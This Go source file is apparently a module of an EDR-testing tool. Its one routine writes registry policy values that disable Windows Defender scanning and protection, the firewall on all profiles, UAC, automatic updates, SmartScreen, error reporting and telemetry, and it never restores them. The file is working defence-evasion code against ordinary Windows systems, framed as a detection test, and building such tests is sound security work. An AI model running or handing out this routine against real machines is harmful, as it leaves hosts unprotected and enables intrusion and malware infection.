package modules

import (
	"agentide/core"
	"golang.org/x/sys/windows/registry"
	"time"
)

// modifyRegistryPoliciesModule attempts to modify registry policies to disable
// security features. This tests if the EDR monitors and prevents registry-based
// security policy tampering.
type modifyRegistryPoliciesModule struct {
	logger *core.Logger
	cfg    *core.Config
}

func (m *modifyRegistryPoliciesModule) Name() string { return "modify_registry_policies" }

func (m *modifyRegistryPoliciesModule) Run() RawResult {
	start := time.Now()
	result := RawResult{
		ModuleName: m.Name(),
		MitreID:    "T1112", // Modify Registry
		Action:     "Attempt to modify registry policies to disable security features",
	}

	disabledCount := 0
	var details []string

	// List of registry policies to attempt to modify
	policies := []struct {
		path        string
		valueName   string
		value       uint32
		description string
	}{
		// Disable Windows Defender
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender`,
			valueName:   "DisableAntiSpyware",
			value:       1,
			description: "Disable Windows Defender Anti-Spyware",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender`,
			valueName:   "DisableRealtimeMonitoring",
			value:       1,
			description: "Disable Windows Defender Real-time Monitoring",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender`,
			valueName:   "DisableScanOnRealtimeEnable",
			value:       1,
			description: "Disable Scan on Realtime Enable",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender`,
			valueName:   "DisableBehaviorMonitoring",
			value:       1,
			description: "Disable Behavior Monitoring",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender`,
			valueName:   "DisableOnAccessProtection",
			value:       1,
			description: "Disable On-Access Protection",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection`,
			valueName:   "DisableRealtimeMonitoring",
			value:       1,
			description: "Disable Real-time Protection (Real-Time Protection key)",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection`,
			valueName:   "DisableBehaviorMonitoring",
			value:       1,
			description: "Disable Behavior Monitoring (Real-Time Protection key)",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection`,
			valueName:   "DisableOnAccessProtection",
			value:       1,
			description: "Disable On-Access Protection (Real-Time Protection key)",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection`,
			valueName:   "DisableScanOnRealtimeEnable",
			value:       1,
			description: "Disable Scan on Realtime Enable (Real-Time Protection key)",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Scan`,
			valueName:   "DisableArchiveScanning",
			value:       1,
			description: "Disable Archive Scanning",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Scan`,
			valueName:   "DisableEmailScanning",
			value:       1,
			description: "Disable Email Scanning",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Scan`,
			valueName:   "DisableRemovableDriveScanning",
			value:       1,
			description: "Disable Removable Drive Scanning",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Scan`,
			valueName:   "DisableScanningMappedNetworkDrivesForFullScan",
			value:       1,
			description: "Disable Scanning Mapped Network Drives",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Scan`,
			valueName:   "DisableScanningNetworkFiles",
			value:       1,
			description: "Disable Scanning Network Files",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Scan`,
			valueName:   "DisableScriptScanning",
			value:       1,
			description: "Disable Script Scanning",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Scan`,
			valueName:   "DisableScheduledScans",
			value:       1,
			description: "Disable Scheduled Scans",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates`,
			valueName:   "DisableUpdateOnStartupWithoutEngine",
			value:       1,
			description: "Disable Signature Updates on Startup",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates`,
			valueName:   "DisableUpdateOnStartupWithEngine",
			value:       1,
			description: "Disable Signature Updates on Startup with Engine",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Quarantine`,
			valueName:   "DisableQuarantine",
			value:       1,
			description: "Disable Quarantine",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows Defender\Reporting`,
			valueName:   "DisableEnhancedNotifications",
			value:       1,
			description: "Disable Enhanced Notifications",
		},
		// Disable Windows Firewall
		{
			path:        `SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile`,
			valueName:   "EnableFirewall",
			value:       0,
			description: "Disable Windows Firewall (Domain Profile)",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile`,
			valueName:   "EnableFirewall",
			value:       0,
			description: "Disable Windows Firewall (Standard Profile)",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\WindowsFirewall\PublicProfile`,
			valueName:   "EnableFirewall",
			value:       0,
			description: "Disable Windows Firewall (Public Profile)",
		},
		// Disable UAC
		{
			path:        `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`,
			valueName:   "EnableLUA",
			value:       0,
			description: "Disable User Account Control (UAC)",
		},
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows\System`,
			valueName:   "EnableLUA",
			value:       0,
			description: "Disable UAC (System Policies)",
		},
		// Disable Windows Update
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU`,
			valueName:   "NoAutoUpdate",
			value:       1,
			description: "Disable Automatic Windows Updates",
		},
		// Disable SmartScreen
		{
			path:        `SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter`,
			valueName:   "EnabledV9",
			value:       0,
			description: "Disable SmartScreen Filter",
		},
		// Disable Windows Error Reporting
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting`,
			valueName:   "Disabled",
			value:       1,
			description: "Disable Windows Error Reporting",
		},
		// Disable Telemetry
		{
			path:        `SOFTWARE\Policies\Microsoft\Windows\DataCollection`,
			valueName:   "AllowTelemetry",
			value:       0,
			description: "Disable Telemetry",
		},
	}

	for _, policy := range policies {
		if m.setRegistryPolicy(policy.path, policy.valueName, policy.value) {
			disabledCount++
			details = append(details, policy.description)
		}
	}

	result.ElapsedMs = time.Since(start).Milliseconds()

	if disabledCount > 0 {
		result.Notes = "Registry policies modified: " + joinStrings(details, "; ")
		result.OSFeedback.ProcessKilled = false
		result.OSFeedback.AccessDenied = false
	} else {
		result.Notes = "No registry policies could be modified; all resisted"
		result.OSFeedback.AccessDenied = true
	}

	return result
}

// setRegistryPolicy sets a registry policy value
func (m *modifyRegistryPoliciesModule) setRegistryPolicy(path, valueName string, value uint32) bool {
	// Try to open existing key
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
	if err != nil {
		// Try to create the key path
		k, _, err = registry.CreateKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
		if err != nil {
			return false
		}
	}
	defer k.Close()

	// Set the value
	err = k.SetDWordValue(valueName, value)
	if err != nil {
		return false
	}

	// Verify the value was set
	val, _, err := k.GetIntegerValue(valueName)
	if err != nil {
		return false
	}

	return val == uint64(value)
}

